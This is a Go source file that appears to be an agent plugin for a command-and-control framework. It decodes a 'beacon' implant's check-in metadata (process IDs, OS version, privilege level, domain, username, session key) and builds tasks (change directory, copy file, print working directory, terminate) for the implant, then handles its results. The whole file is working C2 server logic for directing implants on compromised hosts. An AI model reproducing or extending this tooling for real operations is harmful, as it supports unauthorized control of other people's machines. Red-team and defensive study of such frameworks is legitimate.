package main

import (
	"bytes"
	"encoding/binary"
	"encoding/json"
	"errors"
	"fmt"
	"strconv"
)

const (
	SetName     = "beacon"
	SetListener = "BeaconHTTP"
	SetUiPath   = "_ui_agent.json"
	SetCmdPath  = "_cmd_agent.json"
)

func CreateAgent(initialData []byte) (AgentData, error) {
	var agent AgentData

	/// START CODE HERE

	packer := CreatePacker(initialData)
	agent.Sleep = packer.ParseInt32()
	agent.Jitter = packer.ParseInt32()
	agent.ACP = int(packer.ParseInt16())
	agent.OemCP = int(packer.ParseInt16())
	agent.GmtOffset = int(packer.ParseInt8())
	agent.Pid = fmt.Sprintf("%v", packer.ParseInt16())
	agent.Tid = fmt.Sprintf("%v", packer.ParseInt16())

	buildNumber := packer.ParseInt32()
	majorVersion := packer.ParseInt8()
	minorVersion := packer.ParseInt8()
	internalIp := packer.ParseInt32()
	flag := packer.ParseInt8()

	agent.Arch = "x32"
	if (flag & 0b00000001) > 0 {
		agent.Arch = "x64"
	}

	systemArch := "x32"
	if (flag & 0b00000010) > 0 {
		systemArch = "x64"
	}

	agent.Elevated = false
	if (flag & 0b00000100) > 0 {
		agent.Elevated = true
	}

	IsServer := false
	if (flag & 0b00001000) > 0 {
		IsServer = true
	}

	agent.InternalIP = int32ToIPv4(internalIp)
	agent.Os, agent.OsDesc = GetOsVersion(majorVersion, minorVersion, buildNumber, IsServer, systemArch)

	agent.Async = true
	agent.SessionKey = packer.ParseBytes()
	agent.Domain = string(packer.ParseBytes())
	agent.Computer = string(packer.ParseBytes())
	agent.Username = ConvertCpToUTF8(string(packer.ParseBytes()), agent.ACP)
	agent.Process = ConvertCpToUTF8(string(packer.ParseBytes()), agent.ACP)

	/// END CODE

	return agent, nil
}

func PackTasks(agentData AgentData, tasksArray []TaskData) ([]byte, error) {
	var packData []byte

	/// START CODE HERE

	var (
		array []interface{}
		err   error
	)

	for _, taskData := range tasksArray {
		taskId, err := strconv.ParseInt(taskData.TaskId, 16, 64)
		if err != nil {
			return nil, err
		}
		array = append(array, int(taskId))
		array = append(array, taskData.Data)
	}

	packData, err = PackArray(array)
	if err != nil {
		return nil, err
	}

	size := make([]byte, 4)
	binary.LittleEndian.PutUint32(size, uint32(len(packData)))
	packData = append(size, packData...)

	/// END CODE

	return packData, nil
}

func CreateTask(agent AgentData, command string, args map[string]any) (TaskData, string, error) {
	var (
		taskData    TaskData
		messageInfo string
		err         error
	)

	subcommand, _ := args["subcommand"].(string)

	/// START CODE HERE

	var (
		array    []interface{}
		packData []byte
		taskType TaskType = TASK
	)

	switch command {

	case "cd":
		path, ok := args["path"].(string)
		if !ok {
			err = errors.New("parameter 'path' must be set")
			goto ERROR
		}
		array = []interface{}{8, ConvertUTF8toCp(path, agent.ACP)}
		break

	case "cp":
		messageInfo = "Task: copy file"
		src, ok := args["src"].(string)
		if !ok {
			err = errors.New("parameter 'src' must be set")
			goto ERROR
		}
		dst, ok := args["dst"].(string)
		if !ok {
			err = errors.New("parameter 'dst' must be set")
			goto ERROR
		}
		array = []interface{}{12, ConvertUTF8toCp(src, agent.ACP), ConvertUTF8toCp(dst, agent.ACP)}
		break

	case "pwd":
		messageInfo = "Task: print working directory"
		array = []interface{}{4}
		break

	case "terminate":
		messageInfo = "Task: terminate agent session"
		if subcommand == "thread" {
			array = []interface{}{10, 1}
		} else if subcommand == "process" {
			array = []interface{}{10, 2}
		} else {
			err = errors.New("subcommand must be 'thread' or 'process'")
			goto ERROR
		}

	default:
		err = errors.New(fmt.Sprintf("Command '%v' not found", command))
		goto ERROR
	}

	packData, err = PackArray(array)
	if err != nil {
		goto ERROR
	}

	taskData = TaskData{
		Type: taskType,
		Data: packData,
		Sync: true,
	}

	/// END CODE

ERROR:
	return taskData, messageInfo, err

}

func ProcessTasksResult(ts Teamserver, agentData AgentData, taskData TaskData, packedData []byte) {

	packer := CreatePacker(packedData)
	size := packer.ParseInt32()
	if size-4 != packer.Size() {
		fmt.Println("Invalid tasks data")
	}

	for packer.Size() >= 8 {
		var taskObject bytes.Buffer

		TaskId := packer.ParseInt32()
		commandId := packer.ParseInt32()

		task := taskData
		task.TaskId = fmt.Sprintf("%08x", TaskId)

		switch commandId {

		case 4:
			path := ConvertCpToUTF8(string(packer.ParseString()), agentData.ACP)
			task.Message = "Curren working directory:"
			task.ClearText = path

		default:
			continue
		}

		_ = json.NewEncoder(&taskObject).Encode(task)
		ts.AgentTaskUpdate(agentData.Id, taskObject.Bytes())
	}

}
